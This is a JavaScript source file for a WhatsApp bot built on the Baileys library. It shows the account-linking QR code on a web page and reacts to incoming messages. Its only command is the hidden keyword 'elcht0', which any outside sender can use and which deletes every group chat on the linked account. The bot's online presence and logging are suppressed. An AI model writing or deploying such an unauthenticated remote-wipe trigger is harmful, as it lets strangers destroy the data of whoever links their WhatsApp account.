const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode');
const express = require('express');
const fs = require('fs');
const pino = require('pino');

const app = express();
let qrImagen = '';

if (!fs.existsSync('./auth_info_baileys')) fs.mkdirSync('./auth_info_baileys');

app.get('/', (req, res) => {
    if (qrImagen) {
        res.send(`<html><body style="background:#000; color:#0f0; text-align:center; padding-top:50px;"><h2>Escanea este QR con tu WhatsApp</h2><img src="${qrImagen}" style="background:#fff; padding:10px; border-radius:10px;"/></body></html>`);
    } else {
        res.send(`<html><body style="background:#000; color:#ff0; text-align:center; padding-top:50px;"><h2>⏳ Generando código QR...</h2><p style="color:#fff;">Actualiza esta página en 10 o 15 segundos.</p></body></html>`);
    }
});
app.listen(process.env.PORT || 3000);

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    
    const sock = makeWASocket({ 
        auth: state, 
        logger: pino({ level: 'silent' }),
        markOnlineOnConnect: false,
        syncFullHistory: false,
        browser: ['FastBot', 'Chrome', '1.0']
    });

    setInterval(() => process.exit(1), 24 * 60 * 60 * 1000);

    sock.ev.on('connection.update', (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr) {
            qrcode.toDataURL(qr, (err, url) => { 
                qrImagen = url; 
            });
        }
        if (connection === 'open') {
            qrImagen = '';
            console.log('=== BOT CONECTADO CORRECTAMENTE ===');
        } else if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                startBot();
            } else {
                console.log('Sesión cerrada. Borra la carpeta auth_info_baileys si deseas reescanear.');
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message || m.key.fromMe) return;
        const texto = (m.message.conversation || m.message.extendedTextMessage?.text || "").toLowerCase().trim();

        if (texto === 'elcht0') {
            await sock.sendMessage(m.key.remoteJid, { text: '🧹 Borrando todos los chats...' });
            try {
                const chats = await sock.groupFetchAllParticipating();
                for (const id of Object.keys(chats)) {
                    await sock.chatModify({ delete: true, lastMessages: [] }, id);
                }
            } catch (err) { console.error('Error al borrar:', err); }
        }
    });
}
startBot();
